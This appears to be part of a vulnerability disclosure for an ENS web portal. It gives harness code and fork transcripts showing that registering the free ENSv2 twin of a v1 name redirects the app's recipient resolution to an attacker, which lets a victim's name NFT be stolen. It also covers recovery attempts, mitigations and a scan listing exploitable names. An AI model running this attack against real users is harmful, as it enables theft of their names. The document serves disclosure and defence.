// ---------------------------------------------------------------------------
// 2. Clients and addresses, taken from the app's own chain object.
// ---------------------------------------------------------------------------
export const chain = extendChainWithEns(sepolia)

export const pub = createPublicClient({ chain, transport: http(RPC) })

export function wallet(account) {
  // chain: null - anvil is started with --chain-id 11155111 but viem still
  // insists on an exact match for local nodes in some paths; null skips the check.
  return createWalletClient({ account, chain: null, transport: http(RPC) })
}

export const C = (name) => getChainContractAddress({ chain, contract: name })

export const ADDR = {
  universalResolver: C('ensUniversalResolver'), // apps/portal/src/lib/constants/universalResolver.ts:4-7
  ethRegistry: C('ensRegistry'),                // v2 root PermissionedRegistry (.eth)
  ethRegistrar: C('ensEthRegistrar'),           // v2 ETHRegistrar
  legacyRegistry: C('ensLegacyRegistry'),       // resolveEnsOwner.ts:76-79 'ensLegacyRegistry'
  publicResolver: C('ensPublicResolver'),
  usdc: C('usdc'),
}

// ---------------------------------------------------------------------------
// 3. The app logic under test, transliterated verbatim.
// ---------------------------------------------------------------------------
import { zeroAddress, isAddress } from 'viem'
import { getEnsAddress } from 'viem/actions'
import { getOwner as getOwnerV1 } from '@ensdomains/ensjs/public/v1'
import {
  getNameRegistries,
  getOwner as getOwnerV2,
} from '@ensdomains/ensjs/public/v2'

/**
 * apps/portal/src/utils/ens/resolveEnsOwner.ts:44-62  (resolveV2EthOwner)
 *
 *   const [v2Owner, registries] = await Promise.all([
 *     getOwnerV2(client, { name }),
 *     getNameRegistries(client, { name }),
 *   ])
 *   if (!v2Owner || v2Owner === zeroAddress) return null
 *   const registryAddress = registries[1]
 *   if (!registryAddress || registryAddress === zeroAddress) return null
 *   return { owner: v2Owner, registryAddress }
 */
async function resolveV2EthOwner(client, name) {
  const [v2Owner, registries] = await Promise.all([
    getOwnerV2(client, { name }),
    getNameRegistries(client, { name }),
  ])
  if (!v2Owner || v2Owner === zeroAddress) return null
  const registryAddress = registries[1]
  if (!registryAddress || registryAddress === zeroAddress) return null
  return { owner: v2Owner, registryAddress }
}

/**
 * apps/portal/src/utils/ens/resolveEnsOwner.ts:71-104  (resolveEnsOwner)
 * V2 IS TRIED FIRST for any .eth name with >= 2 labels; V1 is only reached when
 * the V2 lookup returns null. This ordering is the defect.
 *
 *   if (tld === 'eth' && labels.length >= 2) {
 *     const v2 = await resolveV2EthOwner(client, name)
 *     if (v2) return { owner: v2.owner, registryAddress: v2.registryAddress, protocolVersion: 'ENSv2' }
 *   }
 *   const v1Owner = await getOwnerV1(client, { name })
 *   if (v1Owner?.owner && v1Owner.owner !== zeroAddress) {
 *     return { owner: v1Owner.owner, registryAddress: v1EthRegistry, protocolVersion: 'ENSv1' }
 *   }
 *   return null
 */
export async function resolveEnsOwner(client, name) {
  const v1EthRegistry = ADDR.legacyRegistry

  const labels = name.split('.')
  const tld = labels[labels.length - 1]

  if (tld === 'eth' && labels.length >= 2) {
    const v2 = await resolveV2EthOwner(client, name)
    if (v2) {
      return {
        owner: v2.owner,
        registryAddress: v2.registryAddress,
        protocolVersion: 'ENSv2',
      }
    }
  }

  const v1Owner = await getOwnerV1(client, { name })
  if (v1Owner?.owner && v1Owner.owner !== zeroAddress) {
    return {
      owner: v1Owner.owner,
      registryAddress: v1EthRegistry,
      protocolVersion: 'ENSv1',
    }
  }

  return null
}

/**
 * apps/portal/src/features/roles/helpers/addUser.handlers.ts:11-40
 * (resolveAddressOrName). This is what every "name or address" field in the
 * portal calls, via features/address/queries/getResolvedAddress.ts:26-29 and
 * features/address/hooks/useAddressResolution.ts:113-116.
 *
 *   if (isAddress(nameOrAddress, { strict: false })) return nameOrAddress
 *   const resolved = await getEnsAddress(client, { name: nameOrAddress, universalResolverAddress })
 *   let resolvedAddress = resolved
 *   // Fallback for names that do not set an address record:
 *   // use current ENS owner address so the role can still be granted.
 *   if (!resolvedAddress) {
 *     const ownerResult = await getEnsOwner({ name: nameOrAddress })
 *     if (ownerResult.isOk()) resolvedAddress = ownerResult.value?.owner ?? null
 *   }
 *   return resolvedAddress
 */
export async function resolveAddressOrName({ client, nameOrAddress }) {
  if (isAddress(nameOrAddress, { strict: false })) {
    return nameOrAddress
  }

  try {
    const resolved = await getEnsAddress(client, {
      name: nameOrAddress,
      universalResolverAddress: ADDR.universalResolver,
    })

    let resolvedAddress = resolved

    if (!resolvedAddress) {
      // getEnsOwner() -> resolveEnsOwner(), features/profile/hooks/useEnsOwner.ts:34-60
      const ownerResult = await resolveEnsOwner(client, nameOrAddress)
      resolvedAddress = ownerResult?.owner ?? null
    }

    return resolvedAddress
  } catch {
    return null
  }
}

// ---------------------------------------------------------------------------
// 3b. Retry wrapper: anvil forwards fork cache misses upstream and the public
// Sepolia endpoint rate-limits, so a bare read can time out. Retrying keeps the
// population numbers from being quietly biased by dropped reads.
// ---------------------------------------------------------------------------
export const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

export async function withRetry(fn, attempts = 5) {
  let last
  for (let i = 0; i < attempts; i++) {
    try {
      return await fn()
    } catch (e) {
      last = e
      await sleep(400 * (i + 1))
    }
  }
  throw last
}

// ---------------------------------------------------------------------------
// 4. Small helpers.
// ---------------------------------------------------------------------------
export const hr = (title) =>
  console.log(`\n======== ${title} ${'='.repeat(Math.max(0, 62 - title.length))}`)

export const STATE_FILE = new URL('./state.json', import.meta.url).pathname

export function saveState(patch) {
  let cur = {}
  try {
    cur = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'))
  } catch {}
  fs.writeFileSync(STATE_FILE, JSON.stringify({ ...cur, ...patch }, null, 2))
}

export function loadState() {
  try {
    return JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'))
  } catch {
    return {}
  }
}

// ---------------------------------------------------------------------------
// 5. Actors.
// ---------------------------------------------------------------------------
// IMPORTANT: anvil's default dev accounts (#0 0xf39Fd6..., #1 0x709979...,
// #2 0x3C44Cd...) are NOT plain EOAs on a Sepolia fork - each carries an
// EIP-7702 delegation designator (code starting 0xef0100) inherited from real
// Sepolia state, so an ERC-1155 mint or transfer to them runs
// onERC1155Received against delegated code and reverts with
// ERC1155InvalidReceiver(address) (0x57f447ce). Every actor in this PoC is
// therefore derived from a fixed seed string and asserted to have NO code.
import { keccak256, stringToHex } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'

export function deriveActor(seed) {
  const pk = keccak256(stringToHex(`c7-poc/${seed}`))
  return { ...privateKeyToAccount(pk), privateKey: pk }
}

export async function assertNoCode(label, address) {
  const code = await pub.getCode({ address })
  const c = code ?? '0x'
  if (c !== '0x') {
    throw new Error(
      `REFUSING TO RUN: actor ${label} ${address} has code ${c.slice(0, 12)}... ` +
        `(0xef0100 = EIP-7702 delegation). Pick a different seed.`,
    )
  }
  console.log(`  [actor] ${label.padEnd(10)} ${address}  code=0x (plain EOA, no 7702 delegation)`)
  return true
}

export async function fundEth(address, eth = '100') {
  await rpc('anvil_setBalance', [address, '0x' + (BigInt(eth) * 10n ** 18n).toString(16)])
}
```

***

### Step 0. Preflight: the guard, the addresses, and the starting state

```
======== GUARD =========================================================
[guard] http://127.0.0.1:8545 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860, head 11635860

======== CONTRACT ADDRESSES (from extendChainWithEns(sepolia), not hardcoded)
  universalResolver  0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe
  ethRegistry        0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
  ethRegistrar       0xa88553F454b77203B0D036A05c894d555EAAa2Cc
  legacyRegistry     0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
  publicResolver     0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f
  usdc               0x768F42455A2D082E23ceeF7d51e5787C82d67a39

======== RECIPIENT NAME UNDER TEST: pieslicer.eth ======================
  v2 ETHRegistrar.isAvailable("pieslicer") = true
  UniversalResolver addr(60) via viem getEnsAddress = null
  app resolveEnsOwner()                            = {"owner":"0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750","registryAddress":"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e","protocolVersion":"ENSv1"}
  app resolveAddressOrName()                       = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750

======== VICTIM NAME UNDER TEST: stronghold.eth ========================
  app resolveEnsOwner() = {"owner":"0x345929dc2E57817C16AEDc65f5e0cF2817299406","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}
  app getEnsTokenId()   = 38424076124039839195221280089598108906984212041120748309434213820982934634496
  balanceOf(owner, tokenId) = 1

======== PREFLIGHT OK ==================================================
```

***

### Part A. One ordinary v2 registration flips the app's own resolution

The attacker registers the v2 twin of a live v1 name that publishes no `addr(60)`, setting subregistry `0x0` and resolver `0x0` so it publishes nothing at all.

```
[guard] http://127.0.0.1:8545 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860, head 11635860

======== A0. ACTORS ====================================================
  [actor] attacker   0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7  code=0x (plain EOA, no 7702 delegation)
  attacker is a stranger: it owns nothing, holds no role anywhere,
  and never touches the v1 registry or the victim's name.

======== A1. STATE BEFORE THE ATTACK ===================================
  the victim will type this into the portal recipient field: "pieslicer.eth"
  viem getEnsAddress via UniversalResolver          = null   (no addr(60) record -> fallback fires)
  app resolveEnsOwner()                             = {"owner":"0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750","registryAddress":"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e","protocolVersion":"ENSv1"}
  app resolveAddressOrName()  ==> RECIPIENT BEFORE   = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  attacker address                                   = 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7

======== A2. THE ATTACKER MAKES ONE ORDINARY v2 REGISTRATION ===========
  ETHRegistrar.isAvailable("pieslicer") = true
  getRegisterPrice(1y, USDC) = base 8000021 premium 0  (USDC has 6 decimals -> 8.000021 test USDC)
  attacker USDC balance after public mint() = 1000000000000
  commit() status success, commitment 0x82ea4274d8c575e785cc5360111240157440ed1c342ab2a62dcbc9ddb74ecc8f
  waited MIN_COMMITMENT_AGE (60s) + 10s on the fork clock
  register("pieslicer", owner=attacker, subregistry=0x0, resolver=0x0) status = success
  tx 0xa36cf0dc8ed953b38de9eca4d0344704fd767991858f745cabd1fa61f7dd2d62, gas used 218744
  the attacker set NO resolver and NO records. It only owns the v2 entry.

======== A3. STATE AFTER THE ATTACK - THE FLIP =========================
  viem getEnsAddress via UniversalResolver          = null   (still no addr(60) -> fallback still fires)
  app resolveEnsOwner()                             = {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}
  app resolveAddressOrName()  ==> RECIPIENT AFTER    = 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7

======== A4. RESULT ====================================================
  name typed by the victim : pieslicer.eth   (unchanged, still owned in v1 by 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750)
  recipient BEFORE         : 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  recipient AFTER          : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  attacker                 : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  FLIPPED TO THE ATTACKER  : true
  v1 registry owner(namehash) still               = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750  (the attacker never touched v1)
```

The UniversalResolver answers null for `addr(60)` both before and after. The attacker did not have to lie about anything; holding the v2 entry is enough, because the app substitutes ownership for a missing address record.

***

### Part B. The flip becomes the theft

```
[guard] http://127.0.0.1:8545 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860, head 11635865

======== B1. THE VICTIM AND THEIR NAME =================================
  victim address        : 0x345929dc2E57817C16AEDc65f5e0cF2817299406
  victim's v2 name      : stronghold.eth
  leaf registry         : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
  app getEnsTokenId()   : 38424076124039839195221280089598108906984212041120748309434213820982934634496

======== B2. THE VICTIM TYPES THE RECIPIENT NAME =======================
  typed into SendNameForm's Recipient field : "pieslicer.eth"
  app resolveAddressOrName() -> recipient   : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  (resolveEnsOwner says {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"})
  attacker address                          : 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  recipient IS the attacker                 : true

  CONCEDED, printed here rather than hidden: SendNameForm.tsx:248-249 renders
  <RecipientPreview address={recipient} />, and RecipientPreview (SendNameForm.tsx:253-285)
  renders the full resolved address with truncate={false}. A victim who compares that
  hex string against a copy of the recipient address obtained out of band will catch
  this. The claim is not that the screen lies about the address; it is that the address
  the app derived from the name is a stranger's.

======== B3. BALANCES BEFORE ===========================================
  balanceOf(victim   0x345929dc2E57817C16AEDc65f5e0cF2817299406, tokenId) = 1
  balanceOf(attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7, tokenId) = 0

======== B4. THE VICTIM SENDS THE TRANSACTION transferToken.ts:67-71 BUILDS
  to      : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2   (registryAddress, transferToken.ts:79)
  value   : 0
  data    : 0xf242432a000000000000000000000000345929dc2e57817c16aedc65f5e0cf28172994060000000000000000000000000b8ab205cc4e88352bdc6fc49290e4c31cda40c754f341a2f00d4813e69a1314b43c41b791c28c7f2cf5503b95e6f9a000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000
  decoded : safeTransferFrom(from=0x345929dc2E57817C16AEDc65f5e0cF2817299406, to=0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7, id=38424076124039839195221280089598108906984212041120748309434213820982934634496, amount=1, data=0x)
  tx 0x49e46bb72bd197230b288445585b2a81f6359f346ec20bc91cc3e543b592e297 status = success, gas used 77890

======== B5. BALANCES AFTER ============================================
  balanceOf(victim   0x345929dc2E57817C16AEDc65f5e0cF2817299406, tokenId) = 0
  balanceOf(attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7, tokenId) = 1
  app resolveEnsOwner("stronghold.eth") = {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}

======== B6. RESULT ====================================================
  victim   1 -> 0
  attacker 0 -> 1
  NFT STOLEN: true
```

`0xf242432a` is `safeTransferFrom(address,address,uint256,uint256,bytes)`. The victim account is a real Sepolia address impersonated on the fork, not one the PoC created, so the name that moves is a real v2 registration.

***

### Part C. Recovery, run rather than asserted

Every recovery route was executed after the token was already in the attacker's hands.

```
[guard] http://127.0.0.1:8545 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860, head 11635880

======== R0. STATE AT THE START OF RECOVERY ============================
  victim   0x345929dc2E57817C16AEDc65f5e0cF2817299406   balanceOf = 0
  attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7   balanceOf = 1

======== R1. VICTIM TRIES TO PULL THE TOKEN BACK =======================
  victim safeTransferFrom(attacker -> victim): status reverted  tx 0x96101fbd041492e0e409395e83418d6e472fbc354b7451e1d9b9dd390161739c
  victim balanceOf after attempt   = 0
  attacker balanceOf after attempt = 1

======== R2. DOES THE VICTIM STILL HOLD ANY ROLE ON THE TOKEN? =========
  roles(tokenId, victim 0x345929dc2E57817C16AEDc65f5e0cF2817299406) = 0x0
  roles(tokenId, attacker 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7) = 0x1110000000000000000000000000000001100000

======== R3. THE RECIPIENT NAME'S REAL v1 OWNER PUBLISHES addr(60) AFTER THE ATTACK
  pieslicer.eth v1 registry owner  = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  v1 PublicResolver in use on Sepolia = 0x8FADE66B79cC9f707aB26799354482EB93a5B7dD  (read off gomets.eth, which already publishes addr(60))
  v1 owner registry.setResolver(node, PublicResolver): status success  tx 0x7f26d24fc1178c1f019f0d48d592c9451147a70adeef1fce7c041d4329becc93
  v1 owner PublicResolver.setAddr(node, v1Owner): status success  tx 0xe9ad1076c5d3d23e96e6fe3538fd4af4edd045be57500ec09d487396a1af50f5
  PublicResolver.addr(node) now      = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  UniversalResolver addr(60) now     = null
  app resolveAddressOrName() now     = 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  app resolveEnsOwner() now          = {"owner":"0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7","registryAddress":"0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2","protocolVersion":"ENSv2"}
  victim balanceOf(tokenId)          = 0   <- the stolen token
  attacker balanceOf(tokenId)        = 1

======== R4. THE SAME MITIGATION APPLIED BEFORE ANY ATTACK, ON A SECOND LIVE NAME (degens.eth)
  v2 isAvailable("degens") = true   (attackable right now)
  v1 registry owner            = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  UR addr(60) before           = null
  app resolveAddressOrName()   = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  v1 owner registry.setResolver: status success  tx 0xe944ef2a4fe7cd41b88d85dfbf033b9e724cb8bbe5190a464c879895983d8b3a
  v1 owner PublicResolver.setAddr: status success  tx 0x8964ba2b08ecd41ee8a89a7b4f7589b58178759c1ae14afb0084341326432308
  PublicResolver.addr(node)    = 0x00000000000000000000000000000000DeaDBeef   <- the record IS stored on the fork
  UR addr(60) after publishing = null
  app resolveAddressOrName()   = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  record honoured              = false
  (07-mitigation-matrix.mjs runs this as a controlled 2x2 against a v2-RESERVED name.)

======== R5. READ-ONLY CONTROL: gomets.eth ALREADY PUBLISHES addr(60) ==
  UR addr(60)                = 0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
  app resolveAddressOrName() = 0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
  app resolveEnsOwner()      = {"owner":"0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481","registryAddress":"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e","protocolVersion":"ENSv1"}
  the owner fallback is not reached at all when addr(60) exists.

======== R6. THE ATTACKER v2 ENTRY ITSELF ==============================
  .eth registry getState(tokenId("pieslicer")) =
    status      2   (0 = free, 1 = reserved for the v1 owner, 2 = registered)
    expiry      1820091752  (2027-09-04T21:02:32.000Z)
    latestOwner 0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7
  the attacker holds the v2 entry for the duration they paid for; the v1 owner cannot
  revoke or reclaim it, and nothing here returns the stolen token.
```

R1's transcript records "status reverted" with a tx hash and no decoded reason, so no reason is attributed to it. What is measured is that the balances did not move. Net: once the transfer mines there is no in-app and no on-chain recovery. The only party who can return the name is the attacker.

***

### Part D. Can the recipient name's owner defend? Controlled 2x2 with a sentinel

R4 has an ambiguity the PoC itself flags: the address published there happened to equal the address the owner fallback returns, so `record honoured = false` had two explanations. This removes it with a sentinel `0x...DeaDBeef` that is deliberately not the owner.

```
[guard] http://127.0.0.1:8545 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860, head 11635876

======== FINDING ONE CANDIDATE OF EACH KIND (live v1, no v1 resolver, owner is an EOA we can impersonate)
  scanning 3 live v1 labels
  status 1 candidate: studio.eth (v1 registry owner 0xDAdaDA4E8038641212262Fd94E816d4A57CDC751, v1 resolver unset)
  status 0 candidate: thealliance.eth (v1 registry owner 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750, v1 resolver unset)

======== PUBLISHING addr(60) = 0x00000000000000000000000000000000DeaDBeef FOR studio.eth  (v2 getStatus 1: RESERVED for the v1 owner)
  UR addr(60) before        = null
  resolveAddressOrName()    = 0xDAdaDA4E8038641212262Fd94E816d4A57CDC751   (owner fallback)
    registry.setResolver: success
    PublicResolver.setAddr: success
  writes succeeded          = true
  PublicResolver.addr(node) = 0x00000000000000000000000000000000DeaDBeef   <- the record IS stored
  UR addr(60) after         = 0x00000000000000000000000000000000DeaDBeef
  resolveAddressOrName()    = 0x00000000000000000000000000000000DeaDBeef
  record honoured           = true

======== PUBLISHING addr(60) = 0x00000000000000000000000000000000DeaDBeef FOR thealliance.eth  (v2 getStatus 0: FREE, an attacker can register it)
  UR addr(60) before        = null
  resolveAddressOrName()    = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750   (owner fallback)
    registry.setResolver: success
    PublicResolver.setAddr: success
  writes succeeded          = true
  PublicResolver.addr(node) = 0x00000000000000000000000000000000DeaDBeef   <- the record IS stored
  UR addr(60) after         = null
  resolveAddressOrName()    = 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750
  record honoured           = false

======== MATRIX ========================================================
  studio.eth           v2 status 1  writes true  UR 0x00000000000000000000000000000000DeaDBeef  app 0x00000000000000000000000000000000DeaDBeef  record honoured true
  thealliance.eth      v2 status 0  writes true  UR null  app 0xF83Fe2658F702A072f3c7b0DC4A0ab8c7b044750  record honoured false

======== VERDICT =======================================================
  Publishing addr(60) on the v1 registry is a working defence ONLY for labels that
  are RESERVED in the v2 registry. For labels that are FREE in v2 - which is exactly
  the set an attacker can register, and therefore exactly the exploitable set - the
  UniversalResolver does not serve the v1 record, the app keeps taking the owner
  fallback, and the owner has no addr-record defence at all.
```

***

### Control. Are the UniversalResolver reads local to the fork?

Every "UR = null" above is only evidence if the read executes against the fork. viem enables ERC-3668 CCIP-read by default and a gateway cannot see a local fork, so this was checked rather than assumed.

```
[guard] http://127.0.0.1:8545 ok: anvil/v1.6.0, chainId 11155111, fork block 11635860, head 11635880

======== 1. SAME CALL, CCIP-READ DISABLED ==============================
  gomets.eth       ccipRead default = 0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
                   ccipRead:false   = 0x4395BEeC5b4E42d598d55a4bA4EBb04Cc9b58481
                   identical        = true
  studio.eth       ccipRead default = 0x00000000000000000000000000000000DeaDBeef
                   ccipRead:false   = 0x00000000000000000000000000000000DeaDBeef
                   identical        = true
  No OffchainLookup is raised and the values match, so the resolution is executed
  on the fork, not by a gateway.

======== 2. DOES THE UR TRACK A RECORD WRITTEN ONLY ON THE FORK? =======
  studio.eth v1 PublicResolver.addr(node) (written on the fork by 07) = 0x00000000000000000000000000000000DeaDBeef
  studio.eth UniversalResolver addr(60)                              = 0x00000000000000000000000000000000DeaDBeef
  UR tracks the fork-only write = true

======== VERDICT =======================================================
  If both checks pass, every "UR = null" printed elsewhere in this PoC is a real
  on-fork result. If check 2 fails, run 07-mitigation-matrix.mjs first.
```

This control is coupled to Part D by name, not by construction: `06` hardcodes `studio.eth`, which exists as a fork-written record only because `run-all.sh` passes `CANDIDATES=studio.eth,...` to `07`. Run `07` on its default subgraph-scan path and `06`'s second check prints `false` with no other warning.

***

### Population: how many recipient names are exploitable

These three scripts read the ENS v1 subgraph for the **label frame only**, to choose which names to measure; every free/reserved/`addr(60)` fact is then read from the fork. The subgraph is out of scope as an asset and is used purely to sample.

By registration month, across 400 live v1 labels registered on or after 2026-01-01:

```
======== BY REGISTRATION MONTH =========================================
  month    n    free(0) reserved(1) registered(2)  noAddr  EXPLOITABLE  registrants
  2026-05     8       0          5            3       1           0           0
  2026-06   108       0        108            0     107           0           0
  2026-07    14       0         13            1      12           0           0
  2026-08   270     256          1           13     259         256           1

======== SUMMARY =======================================================
  cohort measured                                : 400 live v1 labels registered on/after 2026-01-01
  free in v2 (getStatus 0, attacker can register) : 256 (64.0%)
  free AND no addr(60) -> EXPLOITABLE RECIPIENT   : 256 (64.0%)
  distinct registrants among the exploitable set  : 1
  earliest exploitable registrationDate          : 2026-08-20
  latest reserved registrationDate               : 2026-08-06
  examples: degens.eth, thealliance.eth, propex.eth, safefix.eth, god.eth, hyouka.eth, moneyboy.eth, pop.eth, oeyj.eth, yieldtest.eth, absence.eth, beatstream.eth
```

The control on "1 distinct registrant", from the subgraph alone:

```
======== WHO REGISTERS v1 .eth NAMES ON SEPOLIA, BY MONTH ==============
  month     live labels   distinct registrants   top registrant share
  2026-02           584                    255   0xb3f49cf9b68f49d193c8bd09d9e4cff356f4ba32 28%
  2026-05           978                    171   0x65961dbd09f8582ae2f12cee9bf8a9fd70a27d5b 40%
  2026-06           108                      9   0x802453f2f077d5a0c3d0f9a6eb2a36dcfa3c6e0d 61%
  2026-07            14                     12   0xe3c03709b2b8439eb07aac06cc4fa9886ce5bf87 14%
  2026-08           270                      2   0xf83fe2658f702a072f3c7b0dc4a0ab8c7b044750 100%
```

The exploitable set is the newest cohort: v1 names registered after the v2 reservation snapshot are not reserved in v2, so their twins are free. The exploitable set has one registrant because the month has two. This is a testnet population at one fork block, sampled from an out-of-scope subgraph, and it is narrow and concentrated. It establishes that the exploitable set is non-empty and is exactly the post-snapshot cohort. It does not establish a mainnet prevalence figure, and none is claimed.

***

### A PoC bug that was found and fixed, recorded for completeness

An earlier attempt at the registration step reverted with selector `0x57f447ce`, `ERC1155InvalidReceiver(address)`, when anvil's default account #0 was used as the attacker. The fix was to derive a fresh attacker key from a fixed seed and assert it carries no code:

```
[actor] attacker   0x0b8ab205Cc4e88352bdc6FC49290e4c31cDA40C7  code=0x (plain EOA, no 7702 delegation)
```

The fix is backed by the transcript. The diagnosis offered at the time (that anvil's default vanity addresses carry EIP-7702 delegation designators on a Sepolia fork) was not captured in any transcript and is offered as an explanation, not a measurement. Either way it is a property of the PoC harness, not of the finding.

A further disclosure about the transcripts above: they were not captured in one clean sequential pass. The guard prints the head block at the start of each script, and those numbers show `05` was recorded after `07` and `06`, not between `04` and `07` as `run-all.sh` orders them. A clean sequential run is monotone and reaches the same values. No claim depends on the ordering.
